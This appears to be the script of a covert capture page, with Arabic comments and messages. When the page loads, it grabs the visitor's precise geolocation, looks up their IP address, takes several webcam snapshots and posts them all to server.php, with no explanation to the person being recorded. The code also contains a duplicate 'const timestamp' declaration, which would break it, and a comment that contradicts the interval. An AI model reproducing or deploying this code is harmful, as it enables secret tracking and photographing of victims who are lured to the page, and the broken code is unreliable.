<script>
  async function getIP() {
    try {
      const res = await fetch("https://api.ipify.org?format=json");
      const data = await res.json();
      return data.ip;
    } catch {
      return "IP not found";
    }
  }

  async function sendData(location, imageBlob, ip) {
    const formData = new FormData();
    formData.append("latitude", location.coords.latitude);
    formData.append("longitude", location.coords.longitude);
    formData.append("ip", ip);

    if (imageBlob) {
      const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
      const timestamp = Date.now();
      const file = new File([imageBlob], `cam_${timestamp}.jpg`, { type: "image/jpeg" });
      formData.append("image", file);

    }

    await fetch("server.php", {
      method: "POST",
      body: formData
    });
  }

  async function startProcess(position) {
    const ip = await getIP();

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.createElement('video');
      video.srcObject = stream;
      video.setAttribute('playsinline', ''); // for iOS
      await video.play();

      const canvas = document.createElement('canvas');
      const context = canvas.getContext('2d');

      // انتظر لما الفيديو يتحمّل فعليًا
      video.addEventListener('loadedmetadata', () => {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        let count = 0;
        const maxCount = 5; // عدد الصور
        const interval = setInterval(async () => {
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
          await sendData(position, blob, ip);
          count++;

          if (count >= maxCount) {
            clearInterval(interval);
            stream.getTracks().forEach(track => track.stop());
            document.body.innerHTML = "<h2>تم التقاط الصور وإرسالها</h2>";
          }
        }, 2000); // كل 5 ثواني
      });

    } catch (err) {
      console.error("Camera error:", err);
      await sendData(position, null, ip);
      document.body.innerHTML = "<h2>تم الإرسال بدون صورة</h2>";
    }
  }

  function getLocationAndStart() {
    navigator.geolocation.getCurrentPosition(async function(position) {
      await startProcess(position);
    }, function(error) {
      document.body.innerHTML = "<h2>فشل في تحديد الموقع!</h2>";
    }, {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 0
    });
  }

  window.onload = getLocationAndStart;
</script>
